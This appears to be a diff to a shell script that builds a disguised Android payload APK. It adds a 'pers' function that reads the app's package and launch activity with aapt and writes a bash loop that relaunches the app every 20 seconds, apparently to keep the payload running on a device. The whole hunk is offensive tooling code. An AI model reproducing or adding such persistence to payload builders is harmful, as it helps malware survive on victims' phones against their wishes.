@@ -88,6 +88,14 @@ mkdir output/payload/res/drawable
 cp $icono output/payload/res/drawable/main_icon.png 	
 }
 
+function pers() {
+package=`aapt dump badging $* | grep package | awk '{print $2}' | sed s/name=//g | sed s/\'//g`
+activity=`aapt dump badging $* | grep launchable-activity: | awk '{print $2}' | sed s/name=//g | sed s/\'//g`
+cd output
+filename=`ls -t | head -1`
+name=$(echo $filename | cut -f 1 -d '.')
+(echo "#!/bin/bash"; echo "while true"; echo "do am start --user 0 -a android.intent.action.MAIN -n $package/$activity"; echo "sleep 20"; echo "done") >> $name.sh
+}
 
 
 
